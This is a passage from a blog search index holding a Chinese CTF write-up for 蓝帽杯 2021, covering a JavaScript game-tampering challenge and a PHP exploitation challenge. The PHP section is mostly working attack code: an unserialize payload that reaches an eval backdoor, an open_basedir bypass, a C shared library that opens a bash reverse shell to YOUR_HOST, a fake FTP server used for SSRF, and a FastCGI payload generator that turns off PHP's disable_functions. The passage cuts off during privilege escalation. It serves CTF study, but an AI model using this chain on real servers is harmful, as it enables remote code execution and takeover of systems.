<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>蓝帽杯 2021</title>
      <link href="/zh-CN/posts/e43fbefd.html"/>
      <url>/zh-CN/posts/e43fbefd.html</url>
      
        <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Ball-sigin"><a href="#Ball-sigin" class="headerlink" title="Ball_sigin"></a>Ball_sigin</h3><p>egret 引擎开发的小游戏，主要的代码都在 Games.js 中。主要的玩法是操作小球滑动躲避树并收集对应左上角单词缺失的字母。将 Games.js 下载下来后格式化，可以发现在<code>hitWordLetter()</code> 方法下有如下逻辑。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>._score === <span class="number">60</span>) &#123;</span><br><span class="line"><span class="built_in">this</span>.gameOverFunc();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是只要分数达到六十分即可获胜，定位到 <code>gameOverFunc()</code> 可以发现获胜结果是通过向 <code>/testData</code> 发送 POST 请求从服务端获取的，其中提交的数据结构如下。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> datas = &#123;</span><br><span class="line"><span class="string">&#x27;balls&#x27;</span>: <span class="built_in">this</span>._balls,</span><br><span class="line"><span class="string">&#x27;trees&#x27;</span>: <span class="built_in">this</span>._trees,</span><br><span class="line"><span class="string">&#x27;words&#x27;</span>: <span class="built_in">this</span>._words,</span><br><span class="line"><span class="string">&#x27;infos&#x27;</span>: <span class="built_in">this</span>._infos</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>将 <code>gameOverFunc()</code> 处的判断改一下，使其无论分数多少都提交数据，从而得到如下提交样例。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/7f363bdc-676b-4e98-b8ef-59cfda4fd170/1619697838325.4f1b9e467ccf84e6a2b596cef2bfc5c88fb973d1.png"></p><p>可以发现树的位置和单词的位置以及小球的位置都会被实时记录，因此想要手动伪造一份记录十分困难。定位到 <code>addBarriers()</code> 方法可以发现树的坐标是随机生成的，因此可以稍作修改使树排排站。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">treeBg.x = <span class="number">1</span>;</span><br><span class="line">treeBg.y = <span class="built_in">Math</span>.random() * (<span class="built_in">this</span>._stageH - <span class="number">80</span> - (<span class="built_in">this</span>._isFitstApperar ? <span class="number">500</span> : <span class="number">0</span>)) + (<span class="built_in">this</span>._isFitstApperar ? <span class="number">500</span> : <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>使用 Fiddler 拦截请求来替换 Games.js，即可轻松完成游戏设定的目标。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/7f363bdc-676b-4e98-b8ef-59cfda4fd170/1619697410922.9a61625f26a8fcbfcfd85c5661c44861ce5d0534.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;f2852395-1f2b-47a6-bd29-cd54bb67a614&#125;</span><br></pre></td></tr></table></figure><h3 id="one-Pointer-php"><a href="#one-Pointer-php" class="headerlink" title="one_Pointer_php"></a>one_Pointer_php</h3><blockquote><p>how to change my euid？</p></blockquote><h4 id="PHP-INT-MAX-导致赋值报错"><a href="#PHP-INT-MAX-导致赋值报错" class="headerlink" title="PHP_INT_MAX 导致赋值报错"></a>PHP_INT_MAX 导致赋值报错</h4><p>下载题目给出的附件，可以得到如下代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;user.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>=unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&quot;data&quot;</span>]))&#123;</span><br><span class="line"><span class="variable">$count</span>[++<span class="variable">$user</span>-&gt;count]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$count</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line"><span class="variable">$user</span>-&gt;count+=<span class="number">1</span>;</span><br><span class="line">setcookie(<span class="string">&quot;data&quot;</span>,serialize(<span class="variable">$user</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&quot;backdoor&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$user</span>=<span class="keyword">new</span> User;</span><br><span class="line"><span class="variable">$user</span>-&gt;count=<span class="number">1</span>;</span><br><span class="line">setcookie(<span class="string">&quot;data&quot;</span>,serialize(<span class="variable">$user</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$count</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>很容易发现判断的语句是一个赋值语句，因此需要尝试让赋值语句返回 <code>false</code>。恰巧赋值的是一个数组，当数组的下标达到 <code>PHP_INT_MAX</code> 即 9223372036854775807 时再次使用 <code>$count[]=1</code> 增加新的数组元素时即会失败。因此只要让 <code>$count</code> 的值为 <code>PHP_INT_MAX</code> 即可，构造出如下序列化脚本。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$count</span> = PHP_INT_MAX - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> User);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行脚本得到了如下载荷。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;count&quot;</span>;i:<span class="number">9223372036854775806</span>;&#125;</span><br></pre></td></tr></table></figure><p>将载荷拼接到 <code>$_COOKIE[&quot;data&quot;]</code> 中即可到达 <code>eval($_GET[&quot;backdoor&quot;]);</code>，从而执行一部分指令。执行 <code>phpinfo()</code> 可以发现靶机所使用的是 PHP 7.4.16，且有如下 disable_functions 和 disable_classes。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">stream_socket_client,fsockopen,putenv,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,iconv,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,error_log,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive</span><br><span class="line"></span><br><span class="line">Exception,SplDoublyLinkedList,Error,ErrorException,ArgumentCountError,ArithmeticError,AssertionError,DivisionByZeroError,CompileError,ParseError,TypeError,ValueError,UnhandledMatchError,ClosedGeneratorException,LogicException,BadFunctionCallException,BadMethodCallException,DomainException,InvalidArgumentException,LengthException,OutOfRangeException,PharException,ReflectionException,RuntimeException,OutOfBoundsException,OverflowException,PDOException,RangeException,UnderflowException,UnexpectedValueException,JsonException,SodiumException</span><br></pre></td></tr></table></figure><h4 id="FTP-SSRF-攻击-PHP-FPM-FastCGI"><a href="#FTP-SSRF-攻击-PHP-FPM-FastCGI" class="headerlink" title="FTP SSRF 攻击 PHP-FPM/FastCGI"></a>FTP SSRF 攻击 PHP-FPM/FastCGI</h4><blockquote><p><a href="https://whoamianony.top/2021/05/02/Web%E5%AE%89%E5%85%A8/%E6%B5%85%E5%85%A5%E6%B7%B1%E5%87%BA%20Fastcgi%20%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E4%B8%8E%20PHP-FPM%20%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/">https://whoamianony.top/2021/05/02/Web%E5%AE%89%E5%85%A8/%E6%B5%85%E5%85%A5%E6%B7%B1%E5%87%BA%20Fastcgi%20%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E4%B8%8E%20PHP-FPM%20%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/</a></p></blockquote><p>在 phpinfo 中可以发现设置了 open_basedir，因此稍微用 <code>chdir()</code> 与 <code>ini_set()</code> 组合来绕过一下可以得到如下载荷来读到 nginx 的配置文件，从而可以得到 FastCGI 的端口。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?backdoor&#x3D;mkdir(%27h3x%27);chdir(%27h3x%27);ini_set(%27open_basedir%27,%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);ini_set(%27open_basedir%27,%27&#x2F;%27);echo file_get_contents(&#39;&#x2F;etc&#x2F;nginx&#x2F;sites-enabled&#x2F;default&#39;);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># pass PHP scripts to FastCGI server</span><br><span class="line">#</span><br><span class="line">location ~ \.php$ &#123;</span><br><span class="line">    root           html;</span><br><span class="line">    fastcgi_pass   127.0.0.1:9001;</span><br><span class="line">    fastcgi_index  index.php;</span><br><span class="line">    fastcgi_param  SCRIPT_FILENAME  &#x2F;var&#x2F;www&#x2F;html&#x2F;$fastcgi_script_name;</span><br><span class="line">    include        fastcgi_params;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>使用如下代码编译出反弹 shell 的恶意 so 文件。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/YOUR_HOST/3255 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc hpdoger.c -fPIC -shared -o hpdoger.so</span><br></pre></td></tr></table></figure><p>拼接使用如下的载荷将编译好的文件上传到靶机。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy(<span class="string">&#x27;http://YOUR_HOST/hpdoger.so&#x27;</span>, <span class="string">&#x27;/tmp/hpdoger.so&#x27;</span>);print_r(scandir(<span class="string">&#x27;/tmp&#x27;</span>));</span><br></pre></td></tr></table></figure><p>成功时可以得到如下回显。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Array ( [0] &#x3D;&gt; . [1] &#x3D;&gt; .. [2] &#x3D;&gt; hpdoger.so )</span><br></pre></td></tr></table></figure><p>写一个恶意的 FTP 客户端。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket <span class="keyword">as</span> Socket</span><br><span class="line">socket = Socket.socket(Socket.AF_INET, Socket.SOCK_STREAM)</span><br><span class="line">socket.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">23</span>))  <span class="comment"># Bind socket to FTP port</span></span><br><span class="line">socket.listen(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">connection, address = socket.accept()</span><br><span class="line">connection.send(<span class="string">b&#x27;220 Welcome to py.evil.lemonprefect.cn\n&#x27;</span>)</span><br><span class="line">connection.send(<span class="string">b&#x27;331 Give me your password\n&#x27;</span>)</span><br><span class="line">connection.send(<span class="string">b&#x27;230 Fake Login Successful\n&#x27;</span>)</span><br><span class="line">connection.send(<span class="string">b&#x27;200 Switch to Binary mode KORA\n&#x27;</span>)</span><br><span class="line">connection.send(<span class="string">b&#x27;550 File Size?\n&#x27;</span>)</span><br><span class="line">connection.send(<span class="string">b&#x27;150 Fine\n&#x27;</span>)</span><br><span class="line">connection.send(<span class="string">b&#x27;227 Now Enter Extended Passive Mode (127,0,0,1,0,9001) Aha\n&#x27;</span>)</span><br><span class="line">connection.send(<span class="string">b&#x27;150 Actually No File\n&#x27;</span>)</span><br><span class="line">connection.send(<span class="string">b&#x27;221 Give me five and a reflect shell\n&#x27;</span>)</span><br><span class="line">connection.close()</span><br></pre></td></tr></table></figure><p>修改参考中的代码生成 payload。</p><blockquote><p><a href="https://github.com/wofeiwo/webcgi-exploits/blob/master/php/Fastcgi/fcgi_jailbreak.php#L29">https://github.com/wofeiwo/webcgi-exploits/blob/master/php/Fastcgi/fcgi_jailbreak.php#L29</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FCGIClient</span></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> VERSION_1 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> BEGIN_REQUEST = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> PARAMS = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">const</span> STDIN = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">const</span> RESPONDER = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_host</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_port</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_keepAlive</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$host</span>, <span class="variable">$port</span> = <span class="number">9000</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_host = <span class="variable">$host</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_port = <span class="variable">$port</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">request</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$params</span>, <span class="variable">$stdin</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$request</span> = <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::BEGIN_REQUEST, chr(<span class="number">0</span>) . chr(<span class="built_in">self</span>::RESPONDER) . chr((<span class="keyword">int</span>)<span class="keyword">$this</span>-&gt;_keepAlive) . str_repeat(chr(<span class="number">0</span>), <span class="number">5</span>));</span><br><span class="line">        <span class="variable">$paramsRequest</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$params</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) <span class="variable">$paramsRequest</span> .= <span class="keyword">$this</span>-&gt;buildNvpair(<span class="variable">$key</span>, <span class="variable">$value</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$paramsRequest</span>) <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::PARAMS, <span class="variable">$paramsRequest</span>);</span><br><span class="line">        <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::PARAMS, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$stdin</span>) <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::STDIN, <span class="variable">$stdin</span>);</span><br><span class="line">        <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::STDIN, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;data=&#x27;</span> . urlencode(<span class="variable">$request</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">buildPacket</span>(<span class="params"><span class="variable">$type</span>, <span class="variable">$content</span>, <span class="variable">$requestId</span> = <span class="number">1</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$clen</span> = strlen(<span class="variable">$content</span>);</span><br><span class="line">        <span class="keyword">return</span> chr(<span class="built_in">self</span>::VERSION_1)</span><br><span class="line">            . chr(<span class="variable">$type</span>)</span><br><span class="line">            . chr((<span class="variable">$requestId</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>)</span><br><span class="line">            . chr(<span class="variable">$requestId</span> &amp; <span class="number">0xFF</span>)</span><br><span class="line">            . chr((<span class="variable">$clen</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>)</span><br><span class="line">            . chr(<span class="variable">$clen</span> &amp; <span class="number">0xFF</span>)</span><br><span class="line">            . chr(<span class="number">0</span>)</span><br><span class="line">            . chr(<span class="number">0</span>)</span><br><span class="line">            . <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">buildNvpair</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$nlen</span> = strlen(<span class="variable">$name</span>);</span><br><span class="line">        <span class="variable">$vlen</span> = strlen(<span class="variable">$value</span>);</span><br><span class="line">        <span class="variable">$nvpair</span> = <span class="variable">$nlen</span> &lt; <span class="number">128</span> ? chr(<span class="variable">$nlen</span>) : chr((<span class="variable">$nlen</span> &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) . chr((<span class="variable">$nlen</span> &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) . chr((<span class="variable">$nlen</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) . chr(<span class="variable">$nlen</span> &amp; <span class="number">0xFF</span>);</span><br><span class="line">        <span class="variable">$nvpair</span> = <span class="variable">$vlen</span> &lt; <span class="number">128</span> ? <span class="variable">$nvpair</span> . chr(<span class="variable">$vlen</span>) : <span class="variable">$nvpair</span> . chr((<span class="variable">$vlen</span> &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) . chr((<span class="variable">$vlen</span> &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) . chr((<span class="variable">$vlen</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) . chr(<span class="variable">$vlen</span> &amp; <span class="number">0xFF</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$nvpair</span> . <span class="variable">$name</span> . <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$filepath</span> = <span class="string">&quot;/var/www/html/add_api.php&quot;</span>;  <span class="comment">// PHP file path</span></span><br><span class="line"><span class="variable">$req</span> = <span class="string">&#x27;/&#x27;</span> . basename(<span class="variable">$filepath</span>);</span><br><span class="line"><span class="variable">$uri</span> = <span class="variable">$req</span> . <span class="string">&#x27;?&#x27;</span> . <span class="string">&#x27;command=whoami&#x27;</span>;</span><br><span class="line"><span class="variable">$client</span> = <span class="keyword">new</span> FCGIClient(<span class="string">&quot;unix:///var/run/php-fpm.sock&quot;</span>, -<span class="number">1</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&quot;&lt;?php system(\$_REQUEST[&#x27;command&#x27;]); phpinfo(); ?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$php_value</span> = <span class="string">&quot;unserialize_callback_func = system\nextension_dir = /tmp\nextension = hpdoger.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = &quot;</span>;  <span class="comment">// import evil hpdoger.so from /tmp</span></span><br><span class="line"><span class="variable">$params</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span> =&gt; <span class="string">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_METHOD&#x27;</span> =&gt; <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_FILENAME&#x27;</span> =&gt; <span class="variable">$filepath</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_NAME&#x27;</span> =&gt; <span class="variable">$req</span>,</span><br><span class="line">    <span class="string">&#x27;QUERY_STRING&#x27;</span> =&gt; <span class="string">&#x27;command=whoami&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_URI&#x27;</span> =&gt; <span class="variable">$uri</span>,</span><br><span class="line">    <span class="string">&#x27;DOCUMENT_URI&#x27;</span> =&gt; <span class="variable">$req</span>,</span><br><span class="line">    <span class="string">&#x27;PHP_VALUE&#x27;</span> =&gt; <span class="variable">$php_value</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_SOFTWARE&#x27;</span> =&gt; <span class="string">&#x27;80sec/wofeiwo&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_ADDR&#x27;</span> =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_PORT&#x27;</span> =&gt; <span class="string">&#x27;9001&#x27;</span>,  <span class="comment">// Fast_CGI Port</span></span><br><span class="line">    <span class="string">&#x27;SERVER_ADDR&#x27;</span> =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PORT&#x27;</span> =&gt; <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_NAME&#x27;</span> =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> =&gt; <span class="string">&#x27;HTTP/1.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;CONTENT_LENGTH&#x27;</span> =&gt; strlen(<span class="variable">$code</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$client</span>-&gt;request(<span class="variable">$params</span>, <span class="variable">$code</span>) . <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p>运行脚本可以得到如下结果。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data&#x3D;%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02%3F%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%B3PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Ftmp%0Aextension+%3D+hpdoger.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00</span><br></pre></td></tr></table></figure><p>构造出如下载荷。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?backdoor&#x3D;$file&#x3D;$_GET[&#39;file&#39;];$data&#x3D;$_GET[&#39;data&#39;];file_put_contents($file, $data);</span><br><span class="line">&amp;file&#x3D;ftp:&#x2F;&#x2F;evil@YOUR_HOST&#x2F;evil&amp;data&#x3D;GENERATED_DATA_HERE</span><br></pre></td></tr></table></figure><p>运行写好的恶意 FTP 服务端，监听在恶意 so 中设定的端口。将载荷拼接后发送后可以在监听端口处得到反弹的 shell。</p><p>使用 <code>find /usr/local/bin -perm -u=s -type f 2&gt;/dev/null</code> 查到 PHP 具有 suid，因此直接使用 PHP 的交互 shell 尝试获取 